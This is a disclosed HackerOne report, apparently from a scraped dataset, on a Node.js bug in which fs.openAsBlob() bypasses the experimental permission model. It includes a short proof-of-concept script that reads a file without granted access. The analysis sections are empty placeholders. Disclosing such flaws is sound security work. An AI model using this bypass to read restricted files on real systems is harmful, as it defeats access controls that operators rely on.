---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1966492'
original_report_id: '1966492'
title: fs.openAsBlob() bypasses permission system
weakness: Improper Access Control - Generic
team_handle: nodejs
created_at: '2023-04-29T22:18:42.414Z'
disclosed_at: '2023-07-20T20:57:15.352Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
asset_identifier: https://github.com/nodejs/node
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# fs.openAsBlob() bypasses permission system

## Metadata

- HackerOne Report ID: 1966492
- Weakness: Improper Access Control - Generic
- Program: nodejs
- Disclosed At: 2023-07-20T20:57:15.352Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** [add summary of the vulnerability]
`fs.openAsBlob()` does not appear to be limited by the permission system.

**Description:** [add more details about this vulnerability]
Starting Node with `--experimental-permission` does not appear to restrict `fs.openAsBlob()`.

## Steps To Reproduce:

Run the following code with `--experimental-permission` and do not grant is read access to `file.txt`:

```js
'use strict';
const fs = require('node:fs');

async function main() {
	const blob = await fs.openAsBlob(__dirname + '/file.txt');

	console.log(await blob.text());
}

main();
```

## Impact: [add why this issue matters]

The permission system is bypassed when it should not be.

## Supporting Material/References:

None

## Impact

An attacker can read files they should not be able to.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
